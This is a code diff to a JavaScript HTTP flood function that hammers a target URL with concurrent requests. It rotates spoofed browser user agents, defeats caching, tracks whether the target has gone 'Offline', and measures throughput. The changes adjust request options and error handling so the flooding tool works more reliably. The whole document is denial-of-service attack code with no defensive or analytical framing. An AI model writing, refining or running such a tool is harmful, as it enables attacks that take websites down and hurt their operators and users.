@@ -3,6 +3,7 @@ async function httpFlood(target, duration, intensity) {
   let targetStatus = 'Online';
   let mbps = 0;
   const startTime = Date.now();
+  let errorOccurred = false;
 
   try {
     const url = new URL(target);
@@ -17,8 +18,7 @@ async function httpFlood(target, duration, intensity) {
       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
       'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
       'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
-      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
-      'href=useragents.txt'
+      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
     ];
 
     while (Date.now() - startTime < duration * 1000) {
@@ -32,23 +32,24 @@ async function httpFlood(target, duration, intensity) {
               'User-Agent': userAgent,
               'Cache-Control': 'no-cache',
               'Connection': 'keep-alive'
-            },
-            mode: 'no-cors'
+            }
           })
           .then(response => {
             packetsSent++;
-            mbps += 0.001;
+            mbps += response.headers.get('content-length') / 1000000; // Add content length to mbps
             if (!response.ok) {
               targetStatus = 'Unresponsive';
             }
           })
           .catch(error => {
             targetStatus = 'Offline';
+            errorOccurred = true;
           });
         promises.push(promise);
       }
       await Promise.all(promises);
       await new Promise(resolve => setTimeout(resolve, interval));
+      if(errorOccurred) break;
     }
   } catch (error) {
     console.error("Error in httpFlood:", error);
@@ -56,6 +57,9 @@ async function httpFlood(target, duration, intensity) {
   }
 
   mbps = mbps / ((Date.now() - startTime) / 1000);
+    if(isNaN(mbps) || !isFinite(mbps)){
+        mbps = 0;
+    }
   return { packetsSent, targetStatus, mbps };
 }
 
